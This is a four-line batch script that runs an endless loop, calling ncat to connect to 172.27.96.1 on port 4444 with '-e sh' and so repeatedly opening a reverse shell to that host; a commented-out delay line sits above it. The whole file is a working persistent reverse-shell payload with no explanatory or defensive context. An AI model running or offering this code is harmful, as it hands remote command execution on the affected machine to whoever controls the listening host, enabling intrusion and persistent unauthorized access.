:loop
rem | choice /c:AB /T:A,30 >nu
ncat 172.27.96.1 4444 -e sh
goto loop
